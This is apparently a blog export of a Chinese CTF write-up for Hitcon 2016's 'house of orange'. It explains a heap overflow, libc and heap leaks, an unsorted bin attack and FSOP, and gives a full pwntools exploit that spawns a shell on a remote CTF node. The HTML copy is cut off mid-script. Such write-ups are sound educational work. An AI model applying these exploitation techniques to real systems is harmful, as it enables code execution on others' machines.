\"\\250\\273\\245~\\210\\177\",\n    _markers = 0x7f887ea5bbc8 <main_arena+168>,\n    _chain = 0x7f887ea5bbc8 <main_arena+168>,\n    _fileno = 2124790744,\n    _flags2 = 32648,\n    _old_offset = 140224217070552,\n    _cur_column = 48104,\n    _vtable_offset = -91 '\\245',\n    _shortbuf = \"~\",\n    _lock = 0x7f887ea5bbe8 <main_arena+200>,\n    _offset = 140224217070584,\n    _codecvt = 0x7f887ea5bbf8 <main_arena+216>,\n    _wide_data = 0x7f887ea5bc08 <main_arena+232>,\n    _freeres_list = 0x7f887ea5bc08 <main_arena+232>,\n    _freeres_buf = 0x7f887ea5bc18 <main_arena+248>,\n    __pad5 = 140224217070616,\n    _mode = 2124790824,\n    _unused2 = \"\\210\\177\\000\\000(\\274\\245~\\210\\177\\000\\000\\070\\274\\245~\\210\\177\\000\"\n  },\n  vtable = 0x7f887ea5bc38 <main_arena+280>\n}\n```\n\n可以看到，在`_IO_list_all`被修改后，`_chain`字段对应的是`main_arena+168`，在bin中对应的就是size为0x60的small bin，因此如果能在small bins[4]的位置放入一个chunk，那么`_chain`字段就会指向该chunk，将该chunk当作是`_IO_2_1_stdout`，我们在该chunk中伪造stdout即可。\n\n而要放入small bins[4]也不困难，我们将unsorted bin chunk的size修改为0x61，后面build时malloc的第1个chunk的大小一定是0x21，不满足条件，这个unsorted bin中的chunk一定会被放入small bins[4]中，这样通过`_chain`找到该chunk。fake file的构造如下：\n\n```py\n# construct fake _IO_2_1_stdout\nfakefile=\"/bin/sh\\x00\"+p64(0x61)+p64(0)+p64(IO_list_all-0x10) # reset bk \nfakefile+=p64(0)+p64(1) # write_base < write_ptr\nfakefile=fakefile.ljust(0xd8,'\\x00')\nfakefile+=p64(heapbase+0x700+0xf0-0x18) # vtable, make _IO_overflow_t <vtable+3*0x8>==sys_addr\nfakefile+=p64(0)*2\nfakefile+=p64(sys_addr)\n```\n\n之后就在该chunk中构造`_IO_2_1_stdout`以及vtable即可，只要偏移算对就没什么问题了。最后伪造chunk头为\"/bin/sh\\x00\"，伪造`_IO_overflow_t`为system，在对该fake file调用`_IO_new_file_overflow()`时即可调用`system(\"/bin/sh\\x00\")`get shell。\n\n最终exp:（只能打通本地，打不通buu，应该是libc不对）\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='orange'\nelf=ELF('./'+filename)\nlibc=ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')\n# p=process('./'+filename)\np=remote('node4.buuoj.cn',27360)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\n\ndef add(size,name,price,color):\n  ru(\"Your choice : \")\n  sl('1')\n  ru(\"Length of name :\")\n  sl(str(size))\n  ru(\"Name :\")\n  s(str(name))\n  ru(\"Price of Orange:\")\n  sl(str(price))\n  ru(\"Color of Orange:\")\n  sl(str(color))\n\ndef see():\n  ru(\"Your choice : \")\n  sl('2')\n\ndef upgrade(size,name,price,color):\n  ru(\"Your choice : \")\n  sl('3')\n  ru(\"Length of name :\")\n  sl(str(size))\n  ru(\"Name:\")\n  s(str(name))\n  ru(\"Price of Orange: \")\n  sl(str(price))\n  ru(\"Color of Orange: \")\n  sl(str(color))\n\n\nadd(0x20,'aaaa',1,56746)\npayload='a'*0x20+p64(0)+p64(0x21)+p32(0xddaa)+p32(0x1)+p64(0) # padding + calloc(0x8)\npayload+=p64(0)+p64(0xf91) # top chunk size == 0xf91\nupgrade(0x50,payload,1,56746) \n# debug()\nadd(0xfc0,'aaaabbbb',1,56746) # house of orange free top chunk\n# debug()\nadd(0x600,'ccccdddd',1,56746) # cut a large bin chunk from old top chunk\n\n# leak libc and heap address by bk and fd_nextsize\nsee()\nru(\"Name of house : \")\nru(\"ccccdddd\")\nlibcbase=uu64(ru('\\n')[:-1]) -0x610 -88 -0x10 -libc.sym['__malloc_hook']\nleak(\"libcbase\",hex(libcbase))\n# debug()\nupgrade(0x10,'f'*0x10,1,56746)\nsee()\nru(\"Name of house : \")\nru('f'*0x10)\nheapbase=uu64(ru('\\n')[:-1])-0xd0\n\nleak(\"libcbase\",hex(libcbase))\nleak(\"heapbase\",hex(heapbase))\n\n# debug()\n\n# FSOP\nIO_list_all=libcbase+libc.sym['_IO_list_all']\nleak(\"IO_list_all\",hex(IO_list_all))\nsys_addr=libcbase+libc.sym['system']\n\n# debug()\n\npayload='a'*0x600+p64(0)+p64(0x21)+p64(0x0000ddaa00000001)+p64(0) # before unsorted bin\nfakefile=\"/bin/sh\\x00\"+p64(0x61)+p64(0)+p64(IO_list_all-0x10) # reset bk and construct fake _IO_2_1_stdout\n# construct fake _IO_2_1_stdout\nfakefile+=p64(0)+p64(1) # write_base < write_ptr\nfakefile=fakefile.ljust(0xd8,'\\x00')\nfakefile+=p64(heapbase+0x700+0xf0-0x18) # vtable\nfakefile+=p64(0)*2\nfakefile+=p64(sys_addr)\npayload+=fakefile\nleak(\"system\",hex(IO_list_all))\nupgrade(0x600+len(payload),payload,1,56746)\n\n# debug()\n# trigger by add\nru(\"Your choice : \")\nsl('1')\n\nitr()\n```\n\n","slug":"houseoforangeHitcon2016","published":1,"updated":"2023-01-12T12:10:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag500495oud2z0t37mw","content":"<p>这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。</p>\n<span id=\"more\"></span>\n\n<p>这题似乎是house of orange的起源，堆题经典保护全开，也是经典的菜单。</p>\n<p>不过只有增查改，没有删除功能，最多只能申请4个chunk，size&lt;=0x1000。</p>\n<p>结构体house:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">house</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> price;</span><br><span class=\"line\">    <span class=\"type\">int</span> color; <span class=\"comment\">//56746 or 31~37</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* name;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中的price和color的0x8字节是用calloc申请的。</p>\n<p>在see house的功能中，如果color为56746，那么只会从0x202080+一个随机数处输出一段字符串，不会输出color。那一段字符串只是不同表情的橙子。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *(_DWORD *)(*new_house + <span class=\"number\">4LL</span>) == <span class=\"number\">56746</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name of house : %s\\n&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)new_house[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Price of orange : %d\\n&quot;</span>, *(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> *)*new_house);</span><br><span class=\"line\">  v0 = rand();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\x1B[01;38;5;214m%s\\x1B[0m\\n&quot;</span>, *((<span class=\"type\">const</span> <span class=\"type\">char</span> **)&amp;unk_203080 + v0 % <span class=\"number\">8</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>upgrade功能只能调用3次，在upgrade中没有比较两次的size，因此在输入name的时候存在堆溢出。</p>\n<p>再仔细看可以发现，在输入name的时候使用的是read，没有在末尾加上<code>&#39;\\x00&#39;</code>，因此有泄露信息的机会。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Length of name :&quot;</span>);</span><br><span class=\"line\">size = get_num();                             <span class=\"comment\">// 没有和原来的size比较</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0x1000</span> )</span><br><span class=\"line\">  size = <span class=\"number\">4096</span>;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name:&quot;</span>);</span><br><span class=\"line\">read_buf((<span class=\"type\">void</span> *)new_house[<span class=\"number\">1</span>], size);         <span class=\"comment\">// 存在堆溢出</span></span><br></pre></td></tr></table></figure>\n\n<p>但是程序并没有free，要free的话只能利用house of orange。</p>\n<p>里面每次的see、upgrade功能均只会对最新build的house进行操作。每次build了一个house之后，new_house就被赋值为新创建的house。</p>\n<p>这道题的总体思路：</p>\n<p><code>House of Orange leak libc -&gt; unsorted bin attack 劫持 _IO_list_all -&gt; FSOP -&gt; 走malloc出现错误到_IO_OVERFLOW </code></p>\n<h2 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h2><p>因为build的功能中对name而言，并没有清除原有的信息，因此free后再malloc可以泄露bin中关于libc和heapbase的信息。我们可以通过house of orange将old top chunk释放到unsorted bin。</p>\n<p>house of orange关键在于要合理伪造新的top chunk size绕过检测，检测如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class=\"number\">0</span>) ||</span><br><span class=\"line\">          ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (old_size) &gt;= MINSIZE &amp;&amp; <span class=\"comment\">//old size&gt;=MINSIZE==0x20</span></span><br><span class=\"line\">           prev_inuse (old_top) &amp;&amp; <span class=\"comment\">//old top chunk&#x27;s prev_inuse==1 最低位为1</span></span><br><span class=\"line\">           ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) old_end &amp; (pagesize - <span class=\"number\">1</span>)) == <span class=\"number\">0</span>)); </span><br><span class=\"line\"><span class=\"comment\">//old_top_chunk_addr+old_size-1==n*0x1000 页地址要对齐，old top chunk后面要是新的一页</span></span><br></pre></td></tr></table></figure>\n\n<p>之后再通过malloc从中切割出新的chunk用来存放name，这个chunk最好是<strong>large bin chunk，这样chunk中的fd和bk指针可以用来泄露libc，fd_nextsize和bk_nextsize则可以用来泄露heapbase</strong>，一次是泄露不完的，可以修改两次分别泄露两个信息。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//从old top chunk中切割出来的chunk</span></span><br><span class=\"line\"><span class=\"number\">0x5647bb6470d0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000611</span></span><br><span class=\"line\"><span class=\"number\">0x5647bb6470e0</span>:\t<span class=\"number\">0x6464646463636363</span>\t<span class=\"number\">0x00007f625ca78188</span></span><br><span class=\"line\"><span class=\"number\">0x5647bb6470f0</span>:\t<span class=\"number\">0x00005647bb6470d0</span>\t<span class=\"number\">0x00005647bb6470d0</span></span><br></pre></td></tr></table></figure>\n\n<p>而old top chunk中余下的部分就有回到了unsorted bin中。</p>\n<h2 id=\"FSOP\"><a href=\"#FSOP\" class=\"headerlink\" title=\"FSOP\"></a>FSOP</h2><p>当malloc出现错误的时候，会调用一系列函数，其调用链为：</p>\n<p><code>malloc() -&gt; malloc_printerr() -&gt; __libc_message() -&gt; abort() -&gt; fflush() -&gt; _IO_flush_all_lockp()</code></p>\n<p>而<code>_IO_flush_all_lockp()</code>会从<code>_IO_list_all</code>开始遍历链表，对所有的IO_FILE逐一进行检查，如果检查通过，那么<code>_IO_OVERFLOW</code>会从虚表中调用<code>_IO_new_file_overflow()</code>。如果我们能**劫持虚表的<code>_IO_new_file_overflow()</code>**，那么就能通过malloc的异常get shell。</p>\n<p>在leak完成之后，我们得到了libcbase和heapbase，但也只剩下1次build和1次upgrade了，进行FSOP需要我们能劫持文件流，并触发对应的函数，因此在upgrade中就要构造好文件流，之后在最后一次build中触发。</p>\n<p>1次堆溢出可以让我们控制unsorted bin中的留下的free chunk。劫持文件流首先就要控制<code>_IO_list_all</code>，我们可以通过堆溢出控制unsorted bin chunk的bk指针，利用unsorted bin attack将unsorted bin头写到<code>_IO_list_all</code>中，这样<code>_IO_list_all</code>就不再指向<code>_IO_2_1_stderr</code>而是指向<strong>unsorted bin头</strong>。</p>\n<p>之后我本以为可以在unsorted bin处伪造<code>_IO_2_1_stderr</code>，但实际上是不行的。写入后的<code>_IO_list_all</code>直接指向<strong>unsorted bin头，而不是unsorted bin</strong>，因此其后面的字段是其他的bin头，而不是unsorted bin中的内容。因此不能直接伪造<code>_IO_2_1_stderr</code>，但是IO_FILE通过<code>_chain</code>字段形成链表，我们可以控制<code>_chain</code>来伪造<code>_IO_2_1_stdout</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus*)<span class=\"number\">0x7f887ea5bb78</span></span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-1188204592</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x5565b92b5700</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x5565b92b5700</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x5565b92b5700</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x7f887ea5bb88</span> &lt;main_arena+<span class=\"number\">104</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f887ea5bb88</span> &lt;main_arena+<span class=\"number\">104</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x7f887ea5bb98</span> &lt;main_arena+<span class=\"number\">120</span>&gt; <span class=\"string\">&quot;\\210\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f887ea5bb98</span> &lt;main_arena+<span class=\"number\">120</span>&gt; <span class=\"string\">&quot;\\210\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f887ea5bba8</span> &lt;main_arena+<span class=\"number\">136</span>&gt; <span class=\"string\">&quot;\\230\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x7f887ea5bba8</span> &lt;main_arena+<span class=\"number\">136</span>&gt; <span class=\"string\">&quot;\\230\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x7f887ea5bbb8</span> &lt;main_arena+<span class=\"number\">152</span>&gt; <span class=\"string\">&quot;\\250\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x7f887ea5bbb8</span> &lt;main_arena+<span class=\"number\">152</span>&gt; <span class=\"string\">&quot;\\250\\273\\245~\\210\\177&quot;</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x7f887ea5bbc8</span> &lt;main_arena+<span class=\"number\">168</span>&gt;,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x7f887ea5bbc8</span> &lt;main_arena+<span class=\"number\">168</span>&gt;,</span><br><span class=\"line\">    _fileno = <span class=\"number\">2124790744</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">32648</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">140224217070552</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">48104</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">-91</span> <span class=\"string\">&#x27;\\245&#x27;</span>,</span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;~&quot;</span>,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f887ea5bbe8</span> &lt;main_arena+<span class=\"number\">200</span>&gt;,</span><br><span class=\"line\">    _offset = <span class=\"number\">140224217070584</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x7f887ea5bbf8</span> &lt;main_arena+<span class=\"number\">216</span>&gt;,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f887ea5bc08</span> &lt;main_arena+<span class=\"number\">232</span>&gt;,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x7f887ea5bc08</span> &lt;main_arena+<span class=\"number\">232</span>&gt;,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x7f887ea5bc18</span> &lt;main_arena+<span class=\"number\">248</span>&gt;,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">140224217070616</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">2124790824</span>,</span><br><span class=\"line\">    _unused2 = <span class=\"string\">&quot;\\210\\177\\000\\000(\\274\\245~\\210\\177\\000\\000\\070\\274\\245~\\210\\177\\000&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f887ea5bc38</span> &lt;main_arena+<span class=\"number\">280</span>&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，在<code>_IO_list_all</code>被修改后，<code>_chain</code>字段对应的是<code>main_arena+168</code>，在bin中对应的就是size为0x60的small bin，因此如果能在small bins[4]的位置放入一个chunk，那么<code>_chain</code>字段就会指向该chunk，将该chunk当作是<code>_IO_2_1_stdout</code>，我们在该chunk中伪造stdout即可。</p>\n<p>而要放入small bins[4]也不困难，我们将unsorted bin chunk的size修改为0x61，后面build时malloc的第1个chunk的大小一定是0x21，不满足条件，这个unsorted bin中的chunk一定会被放入small bins[4]中，这样通过<code>_chain</code>找到该chunk。fake file的构造如下：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># construct fake _IO_2_1_stdout</span></span><br><span class=\"line\">fakefile=<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>+p64(<span class=\"number\">0x61</span>)+p64(<span class=\"number\">0</span>)+p64(IO_list_all-<span class=\"number\">0x10</span>) <span class=\"comment\"># reset bk </span></span><br><span class=\"line\">fakefile+=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>) <span class=\"comment\"># write_base &lt; write_ptr</span></span><br><span class=\"line\">fakefile=fakefile.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fakefile+=p64(heapbase+<span class=\"number\">0x700</span>+<span class=\"number\">0xf0</span>-<span class=\"number\">0x18</span>) <span class=\"comment\"># vtable, make _IO_overflow_t &lt;vtable+3*0x8&gt;==sys_addr</span></span><br><span class=\"line\">fakefile+=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">fakefile+=p64(sys_addr)</span><br></pre></td></tr></table></figure>\n\n<p>之后就在该chunk中构造<code>_IO_2_1_stdout</code>以及vtable即可，只要偏移算对就没什么问题了。最后伪造chunk头为”/bin/sh\\x00”，伪造<code>_IO_overflow_t</code>为system，在对该fake file调用<code>_IO_new_file_overflow()</code>时即可调用<code>system(&quot;/bin/sh\\x00&quot;)</code>get shell。</p>\n<p>最终exp:（只能打通本地，打不通buu，应该是libc不对）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;orange&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">27360</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name,price,color</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Your choice : &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Length of name :&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Name :&quot;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(name))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Price of Orange:&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(price))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Color of Orange:&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(color))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">see</span>():</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Your choice : &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">upgrade</span>(<span class=\"params\">size,name,price,color</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Your choice : &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Length of name :&quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Name:&quot;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(name))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Price of Orange: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(price))</span><br><span class=\"line\">  ru(<span class=\"string\">&quot;Color of Orange: &quot;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(color))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>,<span class=\"number\">1</span>,<span class=\"number\">56746</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x21</span>)+p32(<span 